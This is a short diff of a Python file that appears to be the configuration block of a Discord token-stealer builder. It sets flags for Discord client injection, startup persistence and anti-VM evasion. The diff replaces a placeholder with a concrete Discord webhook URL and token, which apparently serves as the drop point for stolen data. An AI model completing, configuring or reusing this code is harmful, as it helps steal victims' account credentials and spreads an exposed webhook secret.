@@ -16,7 +16,7 @@ import base64
 import time
 
 
-webhook = '%WEBHOOK%'
+webhook = '%https://discord.com/api/webhooks/1377565712633040978/5Z7LjlvTvvYqI1T2c8Yoon1MHPo6kJMx7f6OzRAgZKZISs_hOh49hiyxBbGVikRdZCU8%'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
